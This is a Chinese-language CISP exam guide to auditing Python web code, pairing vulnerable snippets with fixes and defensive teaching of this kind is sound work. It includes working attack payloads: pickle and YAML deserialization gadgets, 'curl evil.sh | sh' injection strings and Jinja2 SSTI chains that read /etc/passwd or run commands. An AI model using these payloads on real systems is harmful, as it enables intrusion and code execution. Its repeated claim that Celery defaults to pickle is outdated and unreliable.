# Python 代码审计实战指南

> **📘 文档定位**：CISP 考试代码审计核心内容 | 难度：⭐⭐⭐⭐ | 预计阅读：22 分钟
> Python 代码审计覆盖 Flask/Django/FastAPI 等主流框架。本文从反序列化、SSTI 模板注入、命令注入到配置安全，系统梳理 Python 生态常见漏洞与审计方法。

---

## 导航目录
- [一、Python Web 生态常见风险总览](#一python-web-生态常见风险总览)
- [二、pickle / YAML / JSON 反序列化](#二pickle--yaml--json-反序列化)
- [三、命令注入](#三命令注入)
- [四、模板注入 (SSTI - Jinja2 / Mako / Tornado)](#四模板注入-ssti---jinja2--mako--tornado)
- [五、SQL 注入](#五sql-注入)
- [六、路径遍历与文件读取/写入](#六路径遍历与文件读取写入)
- [七、SSRF](#七ssrf)
- [八、Flask / Django 配置安全](#八flask--django-配置安全)
- [九、第三方依赖与 CVE 治理](#九第三方依赖与-cve-治理)
- [十、XSS / CSP / CSRF](#十xss--csp--csrf)
- [十一、CheckList](#十一checklist)
- [十二、高分考点与知识巧记](#十二高分考点与知识巧记)

---

## 一、Python Web 生态常见风险总览

| 框架 / 库 | 常见风险 |
|----------|---------|
| **Flask** | `app.debug=True`、`render_template_string` (SSTI)、`app.config['SECRET_KEY']` 弱 secret、`send_file` 路径遍历 |
| **Django** | `extra`、`raw()`、`cursor.execute(sql % user)` 注入、`@login_required` 遗漏、`settings.DEBUG`、`ALLOWED_HOSTS=['*']` |
| **Tornado** | 正则匹配路由、`RequestHandler.write` 未转义、模板注入 |
| **FastAPI / Starlette** | `Response(media_type="text/html")` + HTML 输出无转义、CORS 过宽 (`allow_origins=["*"]`)、SQL 拼接 |
| **SQLAlchemy** | `text()`、`from_statement(text(...))`、`Connection.execute(...)` 未用 params |
| **PyMySQL / psycopg2** | 字符串拼接 SQL |
| **pickle.loads** | 反序列化 RCE (最经典 Python 漏洞) |
| **yaml.load** (PyYAML < 5.1) / `ruamel.yaml` 非 SafeLoader | YAML 反序列化 RCE (`!!python/object:os.system('id')`) |
| **eval() / exec()** | 直接执行代码 (常出现在"表达式计算"场景) |
| **jinja2** SSTI | `Template(userInput).render(...)` |
| **subprocess.run / os.system** | `shell=True` 拼接命令 |
| **requests / urllib** SSRF | `requests.get(userURL)` 未校验协议/内网 |
| **Celery / Redis / RabbitMQ** | 反序列化 pickle (Celery 任务默认使用 pickle) |

## 二、pickle / YAML / JSON 反序列化

```python
# ❌ 1. pickle.loads (最经典 Python RCE)
import pickle
data = pickle.loads(request.data)   # 攻击者构造的 bytes 可执行任意代码

# Pickle 简单 Payload:
#   import pickle,os,base64
#   class R(object):
#       def __reduce__(self):
#           return (os.system, ('id',))
#   print(base64.b64encode(pickle.dumps(R())))

# ❌ 2. yaml.load (PyYAML<5.1 默认不安全; 5.1+ 已 warn 但仍可被显式使用)
import yaml
obj = yaml.load(userInput)
# payload: !!python/object/apply:os.system ["curl evil.sh|sh"]
# payload: !!python/object/new:subprocess.check_output [["id"]]

# ✅ 正确用法
import yaml
obj = yaml.safe_load(userInput)    # 仅支持基本类型, 反序列化安全
# 或升级到 6.x, 仅暴露 safe_load

# ❌ 3. jsonpickle
import jsonpickle
jsonpickle.decode(userInput)       # 反序列化 jsonpickle 特有的格式, 可 RCE

# ❌ 4. shelve / marshal / 自定义序列化
#    shelve.open(path) 使用 pickle, path 可控 ≈ RCE
```

## 三、命令注入

```python
# ❌ shell=True + 字符串拼接 (最常见)
import subprocess
subprocess.run(f"ping -c 2 {host}", shell=True)
# 利用: host = "127.0.0.1; curl evil.sh | sh"

# ✅ 参数列表 + shell=False (默认)
subprocess.run(["ping", "-c", "2", host])

# ❌ os.system / os.popen
os.system("git clone " + url)
os.popen(f"ls {path}").read()

# ✅ shlex.quote 做安全转义 (仍建议参数数组)
import shlex
subprocess.run(f"git clone {shlex.quote(url)}", shell=True, check=True)
```

## 四、模板注入 (SSTI - Jinja2 / Mako / Tornado)

```python
# ❌ Flask / Jinja2: 把用户输入当作模板字符串渲染
from flask import render_template_string
html = render_template_string("Hello, " + request.args.get("name"))
# Payload:
#   name={{ ''.__class__.__mro__[-1].__subclasses__() }} → 遍历 builtin 子类
#   name={{ [].__class__.__base__.__subclasses__().pop(<index>)(["id"]).communicate() }}
#   name={{ config }} → 直接打印 Flask config (含 SECRET_KEY)

# ❌ Mako
from mako.template import Template
Template("Hello, ${name}").render(name=request.args.get("name"))

# ✅ 正确: 把用户输入作为变量传入模板, 不要拼进模板字符串
# render_template("greeting.html", name=request.args.get("name"))
```

### Jinja2 SSTI 利用速查

| 目标 | Payload 示例 |
|------|-------------|
| 列 config | `{{ config }}` / `{{ config.items() }}` |
| 读文件 | `{{ ''.__class__.__mro__[1].__subclasses__()[x]('/etc/passwd').read() }}` |
| RCE | `{{ ''.__class__.__mro__[1].__subclasses__()...Popen(...) }}` |
| 文件写 | `{{ cycler.__init__.__globals__.os.system('echo pwned > /tmp/poc') }}` |

## 五、SQL 注入

```python
# ❌ 字符串拼接
db.execute(f"SELECT * FROM users WHERE name = '{name}'")
db.execute("SELECT * FROM users WHERE name = '%s'" % name)

# ✅ 参数化 (SQLAlchemy)
from sqlalchemy import text
db.execute(text("SELECT * FROM users WHERE name = :n"), {"n": name})

# ✅ Django ORM
User.objects.filter(name=name)   # Django 参数化, 安全
# ❌ 但:
User.objects.raw(f"SELECT * FROM users WHERE name='{name}'")
User.objects.extra(where=[f"name='{name}'"])  # extra 很容易注入
from django.db import connection
with connection.cursor() as c:
    c.execute(f"SELECT ...")   # 要手动参数化: c.execute("SELECT ... WHERE name=%s", [name])

# ✅ 原始 DBAPI 参数化
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))  # 注意 tuple 第二个参数
```

## 六、路径遍历与文件读取/写入

```python
# ❌ 拼接路径到文件系统
path = f"uploads/{request.form['filename']}"
with open(path, "wb") as f: ...
# 利用: filename = "../../../etc/passwd"

# ❌ Flask send_file / send_from_directory
from flask import send_file
send_file(request.args["path"])  # 绝对路径可控 = 任意文件下载

# ✅ 使用 pathlib + 校验前缀
from pathlib import Path
safe_name = Path(request.form["filename"]).name   # 只取 basename
full = (Path(app.config["UPLOAD_ROOT"]) / safe_name).resolve()
if not str(full).startswith(str(Path(app.config["UPLOAD_ROOT"]).resolve())):
    raise PermissionError("path escape")

# ✅ 安全下载:
from flask import send_from_directory
send_from_directory("static", safe_name, as_attachment=True)  # 限定在目录内
```

## 七、SSRF

```python
# ❌ requests / urllib 直接请求用户指定 URL
import requests
r = requests.get(request.args["url"])
# 利用: ?url=file:///etc/passwd  ?url=http://127.0.0.1:6379  ?url=gopher://...

# ❌ XML 外部实体 (XXE):
from lxml import etree
tree = etree.fromstring(user_input)   # 默认 lxml 会解析外部实体

# ✅ lxml 正确配置
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.fromstring(user_input, parser=parser)

# ✅ 标准库 xml.etree.ElementTree 更严格, 但仍建议:
import xml.etree.ElementTree as ET
ET.fromstring(user_input)   # 已禁用实体解析, 但不同版本行为有差异
```

## 八、Flask / Django 配置安全

### Flask

```python
# ❌ 生产仍然 debug=True
app.debug = True      # 可执行任意 Python 代码 (Werkzeug debugger /console)
# 若暴露在外网: 访问 /console?__debugger__=yes&cmd=...

# ❌ 弱 SECRET_KEY
app.config["SECRET_KEY"] = "dev"   # session cookie 可被伪造

# ✅ 生成足够强 key
#   python -c "import secrets; print(secrets.token_urlsafe(32))"

# ❌ Jinja2 autoescape=False (全局关闭 XSS 转义)
env = Environment(autoescape=False)  # 极罕见, 但搜索下
```

### Django

```python
# settings.py
DEBUG = False                         # 生产必须 False (否则泄漏堆栈/变量)
ALLOWED_HOSTS = ["example.com"]       # ❌ 不能设 ["*"]
SECRET_KEY = os.environ["SECRET_KEY"] # ✅ 不能硬编码在代码库
DATABASES = {
    "default": {
        "PASSWORD": os.environ["DB_PASSWORD"]  # ✅ 从环境/Vault 获取
    }
}
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
SECURE_HSTS_SECONDS = 31_536_000

# ❌ CSRF 被豁免
@csrf_exempt
def api(request): ...   # 若无其他鉴权, 易被 CSRF

# ❌ 无速率限制的登录: 可被撞库
# ✅ django-axes / django-ratelimit
```

## 九、第三方依赖与 CVE 治理

- **audit**: `pip-audit` (官方推荐), `safety check`, `jake` (针对 conda), `snyk`
- **SBOM**: `cdxgen` / `pip-audit sbom`
- **漏洞预警关注**: `django` / `flask` / `werkzeug` / `jinja2` / `requests` / `celery` / `djangorestframework` / `sqlalchemy` / `pillow`
- **注意**: Celery 任务默认使用 `pickle` 作为 serializer (`CELERY_TASK_SERIALIZER = 'pickle'`), 若消息队列被污染可 RCE; 务必设置为 `json`

```bash
pip install pip-audit
pip-audit           # 扫描当前环境所有 package 的已知 CVE
# 在 CI 中: pip-audit --requirement requirements.txt --strict
```

## 十、XSS / CSP / CSRF

```python
# ❌ Flask:
return f"<h1>Hello, {name}</h1>"         # 未转义

# ✅ 使用 render_template + Jinja2 默认 autoescape
return render_template("greeting.html", name=name)

# ❌ Django: mark_safe
from django.utils.safestring import mark_safe
return mark_safe(f"<p>{user_input}</p>")  # 禁止把用户输入 mark_safe

# ✅ CSP 响应头 (Flask / Django 都建议启用)
# Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:
```

## 十一、CheckList

- [ ] `pickle.loads` / `yaml.load` / `jsonpickle.decode` 是否处理外部数据?
- [ ] 是否 `subprocess.run` / `os.system` 使用 `shell=True` 拼接字符串?
- [ ] 是否 `eval()` / `exec()` 执行用户输入?
- [ ] 是否 `Template(userString).render()` (Jinja2 SSTI 风险)
- [ ] SQL 是否全部参数化? 搜索 `text(f"` / `execute(f"` / `objects.raw(` / `extra(`
- [ ] 文件上传是否白名单后缀? 是否随机重命名? 是否校验路径前缀?
- [ ] `send_file` / `send_from_directory` 路径是否可控?
- [ ] URL 请求 (requests/urllib/httpx) 是否校验协议 (仅 http/https) + 内网 IP?
- [ ] `settings.DEBUG = True` / `app.debug = True` 生产环境是否仍存在?
- [ ] `SECRET_KEY` / DB 密码 / 第三方 token 是否硬编码?
- [ ] CSRF: Django `@csrf_exempt` 有没有滥用? Flask 是否启用 `WTF_CSRF_ENABLED`?
- [ ] 依赖扫描: 运行 `pip-audit` 是否有高/严重 CVE?
- [ ] 是否 `ALLOWED_HOSTS=['*']` 或 CORS `allow_origins=['*']`?
- [ ] Celery / RQ / 消息队列: serializer 是否为 json (不是 pickle)?

---

## 十二、高分考点与知识巧记

> 🔑 **高分考点**：Python 代码审计高频考点集中在 pickle 反序列化、Jinja2 SSTI、yaml.load 不安全用法。SSTI 是 Python 特有考点，考试常考察 Jinja2 模板注入的利用链。

| 考点 | 频次 | 核心记忆点 |
|:---|:---:|:---|
| pickle 反序列化 | ⭐⭐⭐⭐⭐ | pickle.loads 不可信数据 = RCE，Celery 默认用 pickle |
| SSTI (Jinja2) | ⭐⭐⭐⭐⭐ | render_template_string 拼接用户输入，__mro__ 链读 config/RCE |
| yaml.load | ⭐⭐⭐⭐ | PyYAML<5.1 不安全，safe_load 替代，!!python/object 可 RCE |
| shell=True | ⭐⭐⭐⭐ | subprocess.run + shell=True 拼接 = 命令注入 |
| Flask/Django 配置 | ⭐⭐⭐ | debug=True、弱 SECRET_KEY、ALLOWED_HOSTS=['*'] |

> 💡 **知识巧记**：Python 三大反序列化禁忌：pickle.loads 禁、yaml.load 禁、jsonpickle.decode 禁。SSTI 利用链：`''.__class__.__mro__` → 遍历子类 → 找 Popen → RCE。Flask 配置三忌：debug 开、SECRET_KEY 弱、autoescape 关。

### 高分考点速查表

| 考察维度 | 关键结论 | 常见干扰项 |
|:---|:---|:---|
| pickle vs json | pickle 可执行任意代码，json 安全 | "pickle 和 json 一样安全" ❌ |
| yaml.load vs safe_load | safe_load 只解析基本类型 | "yaml.load 默认安全" ❌ |
| render_template vs render_template_string | 前者变量传入安全，后者拼接危险 | "两者一样" ❌ |
| shell=True 风险 | 字符串拼接 + shell=True = 命令注入 | "shell=True 配合参数列表也安全" ❌ |
| Celery 序列化 | 默认 pickle，必须改为 json | "Celery 默认安全" ❌ |

### 知识巧记口诀

> **Python 代码审计口诀**：
> pickle yaml 是祸根，反序列化 RCE 成。
> SSTI 模板拼输入，mro 链 config 读。
> shell=True 配拼接，命令注入不可忽。
> Flask debug 生产禁，SECRET_KEY 强且独。
> Celery 序列化改 json，pickle 默认不安全。
